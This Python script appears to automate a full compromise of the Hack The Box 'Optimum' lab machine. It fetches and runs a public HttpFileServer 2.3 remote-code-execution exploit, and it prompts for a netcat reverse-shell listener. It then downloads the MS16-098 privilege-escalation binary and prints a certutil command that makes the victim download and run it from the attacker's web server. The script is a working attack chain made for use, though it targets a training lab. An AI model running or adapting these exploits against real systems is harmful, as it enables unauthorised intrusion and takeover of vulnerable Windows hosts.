import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Optimum
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] kostas", "[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.8" # change this if change ip on htb.


def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Optimum Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def exploit_hfs_kostas():
    commands_send("searchsploit -m windows/remote/39161.py && mv 39161.py hfs_exploit.py")
    commands_send(f"sed -i 's/192.168.44.128/{machine_ip}/g' hfs_exploit.py")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[kostas-user Command (Listen-Port-443)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[kostas-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python3 -m http.server 80")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [kostas-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send(f"python2.7 hfs_exploit.py {target_machine} 80")
    commands_send(f"python2.7 hfs_exploit.py {target_machine} 80")

def exploit_administrator_user():
    # commands_send("git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester")
    # commands_send("cd Windows-Exploit-Suggester && python2,7 -u")
    # commands_send("cd Windows-Exploit-Suggester && echo '#Paste systeminfo of machine victim in here.' > systeminfo.txt")
    # commands_send("cd Windows-Exploit-Suggester && python2.7 windows-exploit-suggester.py -d 2025-05* -i systeminfo.txt")

    commands_send("wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe && mv 41020.exe privesc.exe")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Download (Binary .exe)] > " + Fore.LIGHTMAGENTA_EX + f"https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/41020.exe")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python3 -m http.server 80")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Administrator-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Command (Command-Victim)] > " + Fore.LIGHTMAGENTA_EX + f"cd C:\Windows\Temp && mkdir Privesc && cd Privesc")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Command (Command-Victim)] > " + Fore.LIGHTMAGENTA_EX + f"certutil.exe -f -urlcache -split http://{machine_ip}:80/privesc.exe privesc.exe && privesc.exe")

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","kostas connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[kostas] > " + Fore.YELLOW + f"HttpFileServer 2.3 (Exploit) http://{target_machine}");cm.sleep(0.2)
                exploit_hfs_kostas()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[kostas] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.YELLOW + f"MS16-098-Overflow (Exploit) http://{target_machine}");cm.sleep(0.2)
                exploit_administrator_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
